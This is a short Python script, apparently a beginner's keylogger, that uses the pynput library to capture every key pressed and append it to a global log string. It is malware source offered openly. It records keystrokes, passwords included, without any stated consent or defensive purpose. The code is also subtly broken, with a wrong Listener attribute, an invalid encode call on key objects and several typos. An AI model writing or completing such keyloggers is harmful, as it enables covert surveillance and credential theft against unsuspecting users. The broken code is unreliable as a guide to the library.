#pip install pynput
import pynput.keyboard
log = ""
def callback_function(key):
    global log
    try:
        log = log + key.encode("UTF-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    ##pring(log)
keyloggler_listener = pynput.keyboard_Listener(on_press = callback_function)
with keyloggler_listener:
    keyloggler_listener.join()